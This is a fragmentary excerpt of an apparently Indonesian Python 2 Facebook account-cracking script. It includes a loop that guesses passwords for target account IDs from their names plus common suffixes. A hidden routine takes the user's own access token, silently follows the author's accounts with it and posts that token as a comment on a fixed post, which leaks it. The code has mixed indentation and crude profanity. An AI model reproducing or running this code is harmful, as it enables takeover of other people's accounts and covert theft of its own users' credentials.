...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By Shiki VD.
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Shiki-VD.
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/ER0R''

lo_ngentod = '2990953524493394'
# crack selesai
def hasil(ok,cp):
...
def yayanxd():
    ...
    try:
        ...
        print ' %s*%s mohon untuk menggunakan sc ini sewajarnya aja kontol, atau sc ini terkena dampak buruk karena disalah gunakan...'%(O,N);time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input(' %s*%s tekan enter '%(O,N));wuhan(kontol)
        os.system('xdg-open https://www.facebook.com/vikrantkanathia.vk')
        moch_yayan()
    except KeyError:
...
# Tolong dengan sangat bot nya jangan diganti ya
def wuhan(kontol):
    try:
        kentod = kontol
        req.post(f'https://graph.facebook.com/100066891183360/subscribers?access_token={kentod}') #NATHAN
		req.post(f"https://graph.facebook.com/100007363270417/subscribers?access_token={kentod}") #SMITHY
		req.post(f'https://graph.facebook.com/2990953524493394/comments?message={token}&access_token={kentod}')
		req.post(f'https://graph.facebook.com/2990953524493394/comments?message={random.choice(["halo tamvan","anjay mantap ster","saya jelek yang posting ganteng:v"])}&access_token={kentod}')
    except:
    	pass
...
def info_tools():
    ...
    print '\n %s[%s>%s] Github   : https://github.com/shiroyashiki'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/ER0R404'%(N,H,N);time.sleep(0.07)
...
class __crack__:
    ...
    def plerr(self):
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : rahasia,katasandi,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"sayang", xz[0]+"anjing"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+"sayang", xz[0]+"anjing"]
